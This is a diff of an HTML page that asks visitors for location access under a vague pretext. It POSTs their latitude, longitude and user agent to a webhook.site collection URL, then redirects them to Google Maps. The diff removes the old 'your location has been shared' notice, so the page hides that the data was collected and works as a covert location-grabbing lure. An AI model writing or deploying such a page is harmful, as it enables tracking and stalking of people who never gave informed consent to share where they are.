@@ -1,31 +1,45 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
   <title>Location Access</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body>
   <h2>Please allow location access</h2>
-  <p>This is required for the tool to work.</p>
+  <p>This helps us confirm your current location.</p>
 
   <script>
-    navigator.geolocation.getCurrentPosition(
-      function(position) {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
 
-        // Send location to your email or server
-        fetch("https://webhook.site/e124f6e7-38a4-4c10-851d-5172d042b47c", {
-          method: "POST",
-          headers: {"Content-Type": "application/json"},
-          body: JSON.stringify({lat, lon, timestamp: new Date()})
-        });
+          // ✅ Send location to Webhook.site
+          fetch("https://webhook.site/YOUR-UNIQUE-LINK", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              latitude: lat,
+              longitude: lon,
+              timestamp: new Date().toISOString(),
+              userAgent: navigator.userAgent
+            })
+          });
 
-        alert("Thanks! Your location has been shared.");
-      },
-      function(error) {
-        alert("Location access denied.");
-      }
-    );
+          // ✅ Redirect to Google Maps
+          window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
+        },
+        function(error) {
+          alert("Location error: " + error.message);
+        }
+      );
+    } else {
+      alert("Geolocation is not supported by your browser.");
+    }
   </script>
 </body>
 </html>
